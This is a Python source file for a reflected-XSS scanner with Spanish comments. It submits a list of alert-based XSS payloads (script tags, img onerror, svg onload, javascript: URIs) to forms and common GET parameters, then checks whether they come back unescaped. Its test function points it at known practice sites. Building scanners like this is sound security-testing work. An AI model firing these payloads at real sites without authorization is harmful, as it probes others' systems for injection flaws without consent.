# scanners/xss_scanner.py
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re
import time
from typing import List, Dict, Optional

class XSSScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })

        # Payloads de XSS para probar
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "';alert('XSS');//",
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><img src=x onerror=alert("XSS")>',
            "javascript:alert('XSS')",
            '<iframe src="javascript:alert(\'XSS\')"></iframe>'
        ]

    def scan_url(self, target_url: str) -> Dict:
        """
        Escanea una URL buscando vulnerabilidades XSS
        """
        print(f"🔍 Iniciando escaneo XSS para: {target_url}")

        results = {
            "url": target_url,
            "vulnerable": False,
            "vulnerabilities": [],
            "forms_found": 0,
            "params_tested": 0,
            "scan_time": None,
            "error": None
        }

        start_time = time.time()

        try:
            # 1. Obtener la página principal
            response = self.session.get(target_url, timeout=10)
            if response.status_code != 200:
                results["error"] = f"No se pudo acceder a la URL. Código: {response.status_code}"
                return results

            soup = BeautifulSoup(response.text, 'html.parser')

            # 2. Buscar formularios en la página
            forms = soup.find_all('form')
            results["forms_found"] = len(forms)

            print(f"📋 Formularios encontrados: {len(forms)}")

            # 3. Probar XSS en formularios
            for form in forms:
                vuln_found = self._test_form_xss(target_url, form)
                if vuln_found:
                    results["vulnerabilities"].append(vuln_found)
                    results["vulnerable"] = True

            # 4. Probar XSS en parámetros GET
            get_vuln = self._test_get_parameters_xss(target_url)
            if get_vuln:
                results["vulnerabilities"].extend(get_vuln)
                results["vulnerable"] = True

            # 5. Buscar XSS reflejado en la página actual
            reflected_vuln = self._test_reflected_xss(target_url, response.text)
            if reflected_vuln:
                results["vulnerabilities"].append(reflected_vuln)
                results["vulnerable"] = True

        except requests.RequestException as e:
            results["error"] = f"Error de conexión: {str(e)}"
        except Exception as e:
            results["error"] = f"Error inesperado: {str(e)}"

        results["scan_time"] = round(time.time() - start_time, 2)

        # Mostrar resultados
        if results["vulnerable"]:
            print(f"🚨 ¡VULNERABILIDAD XSS ENCONTRADA!")
            print(f"   Vulnerabilidades: {len(results['vulnerabilities'])}")
        else:
            print(f"✅ No se encontraron vulnerabilidades XSS")

        print(f"⏱️  Tiempo de escaneo: {results['scan_time']} segundos")

        return results

    def _test_form_xss(self, base_url: str, form) -> Optional[Dict]:
        """
        Prueba XSS en un formulario específico
        """
        try:
            # Obtener información del formulario
            action = form.get('action', '')
            method = form.get('method', 'get').lower()

            # Construir URL completa
            form_url = urljoin(base_url, action)

            # Obtener todos los campos del formulario
            inputs = form.find_all(['input', 'textarea', 'select'])
            form_data = {}

            for input_field in inputs:
                name = input_field.get('name')
                if name:
                    input_type = input_field.get('type', 'text').lower()

                    # Asignar valores por defecto según el tipo
                    if input_type in ['text', 'search', 'email', 'url']:
                        form_data[name] = 'test_value'
                    elif input_type == 'hidden':
                        form_data[name] = input_field.get('value', '')
                    elif input_type in ['submit', 'button']:
                        continue
                    else:
                        form_data[name] = 'test'

            print(f"🧪 Probando formulario en: {form_url}")
            print(f"   Campos encontrados: {list(form_data.keys())}")

            # Probar cada payload en cada campo
            for field_name in form_data:
                for payload in self.xss_payloads:
                    test_data = form_data.copy()
                    test_data[field_name] = payload

                    try:
                        if method == 'post':
                            response = self.session.post(form_url, data=test_data, timeout=10)
                        else:
                            response = self.session.get(form_url, params=test_data, timeout=10)

                        # Verificar si el payload se refleja sin escape
                        if payload in response.text:
                            print(f"🚨 XSS encontrado en formulario!")
                            return {
                                "type": "Reflected XSS in Form",
                                "location": form_url,
                                "field": field_name,
                                "payload": payload,
                                "method": method.upper(),
                                "severity": "High"
                            }

                    except requests.RequestException:
                        continue

                    # Pequeña pausa para no saturar el servidor
                    time.sleep(0.1)

        except Exception as e:
            print(f"❌ Error probando formulario: {e}")

        return None

    def _test_get_parameters_xss(self, target_url: str) -> List[Dict]:
        """
        Prueba XSS en parámetros GET comunes
        """
        vulnerabilities = []

        # Parámetros comunes para probar
        common_params = ['q', 'search', 'query', 'name', 'email', 'message', 'text', 'input']

        print(f"🧪 Probando parámetros GET comunes...")

        for param in common_params:
            for payload in self.xss_payloads[:3]:  # Solo los primeros 3 payloads para ser más rápido
                try:
                    test_url = f"{target_url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=10)

                    if payload in response.text:
                        print(f"🚨 XSS encontrado en parámetro GET!")
                        vulnerabilities.append({
                            "type": "Reflected XSS in URL Parameter",
                            "location": test_url,
                            "parameter": param,
                            "payload": payload,
                            "method": "GET",
                            "severity": "High"
                        })
                        break  # No probar más payloads en este parámetro

                except requests.RequestException:
                    continue

                time.sleep(0.1)

        return vulnerabilities

    def _test_reflected_xss(self, target_url: str, page_content: str) -> Optional[Dict]:
        """
        Busca patrones de XSS reflejado en el contenido de la página
        """
        # Patrones peligrosos que indican posible XSS
        dangerous_patterns = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'on\w+\s*=',
            r'<iframe[^>]*src\s*=\s*["\']javascript:',
        ]

        for pattern in dangerous_patterns:
            if re.search(pattern, page_content, re.IGNORECASE):
                print(f"⚠️  Patrón peligroso encontrado en la página")
                return {
                    "type": "Potential XSS Pattern",
                    "location": target_url,
                    "pattern": pattern,
                    "severity": "Medium",
                    "description": "Se encontró un patrón que podría indicar vulnerabilidad XSS"
                }

        return None

# Función de prueba para usar el scanner
def test_scanner():
    scanner = XSSScanner()

    # URLs de prueba (sitios seguros para testing)
    test_urls = [
        "http://testphp.vulnweb.com/",  # Sitio de pruebas seguro
        "https://xss-game.appspot.com/level1/frame",  # Juego de XSS para aprender
    ]

    for url in test_urls:
        print(f"\n{'='*60}")
        print(f"PROBANDO: {url}")
        print(f"{'='*60}")

        result = scanner.scan_url(url)

        if result["error"]:
            print(f"❌ Error: {result['error']}")
        else:
            print(f"📊 RESUMEN:")
            print(f"   - Formularios encontrados: {result['forms_found']}")
            print(f"   - Vulnerable: {'SÍ' if result['vulnerable'] else 'NO'}")
            print(f"   - Vulnerabilidades: {len(result['vulnerabilities'])}")
            print(f"   - Tiempo: {result['scan_time']}s")

            if result["vulnerabilities"]:
                print(f"\n🚨 DETALLES DE VULNERABILIDADES:")
                for i, vuln in enumerate(result["vulnerabilities"], 1):
                    print(f"   {i}. {vuln['type']}")
                    print(f"      Ubicación: {vuln['location']}")
                    print(f"      Severidad: {vuln['severity']}")

if __name__ == "__main__":
    test_scanner()
